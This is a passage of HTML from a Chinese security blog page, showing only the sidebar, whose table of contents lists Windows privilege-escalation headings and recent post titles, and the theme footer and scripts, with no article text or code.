Operators&quot; thmuser1...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">deCOLE</div><div class="author-info-description">凡夫俗子岂识我，非到末路不甘休</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.</span> <span class="toc-text">Windows权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.1.</span> <span class="toc-text">常见获取密码方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.2.</span> <span class="toc-text">快速提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.0.3.</span> <span class="toc-text">滥用服务配置错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%8D%B1%E9%99%A9%E7%89%B9%E6%9D%83"><span class="toc-number">1.0.4.</span> <span class="toc-text">滥用危险特权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SeBackup-SeRestore"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">SeBackup &#x2F; SeRestore</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeTakeOwnership"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">SeTakeOwnership</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeImpersonate-SeAssignPrimaryToken"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">SeImpersonate &#x2F; SeAssignPrimaryToken</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.0.4.4.</span> <span class="toc-text">滥用易受攻击软件</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmd总结及利用"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pearcmd总结及利用"/></a><div class="content"><a class="title" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmd总结及利用">Pearcmd总结及利用</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python原型链污染"/></a><div class="content"><a class="title" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Python%E9%BB%91%E5%B8%BD%E5%AD%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="Python黑帽子阅读笔记"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python黑帽子阅读笔记"/></a><div class="content"><a class="title" href="/2025/03/18/Python%E9%BB%91%E5%B8%BD%E5%AD%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="Python黑帽子阅读笔记">Python黑帽子阅读笔记</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redis未授权访问"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis未授权访问"/></a><div class="content"><a class="title" href="/2025/03/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redis未授权访问">Redis未授权访问</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Python沙箱逃逸"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python沙箱逃逸"/></a><div class="content"><a class="title" href="/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Python沙箱逃逸">Python沙箱逃逸</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By deCOLE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>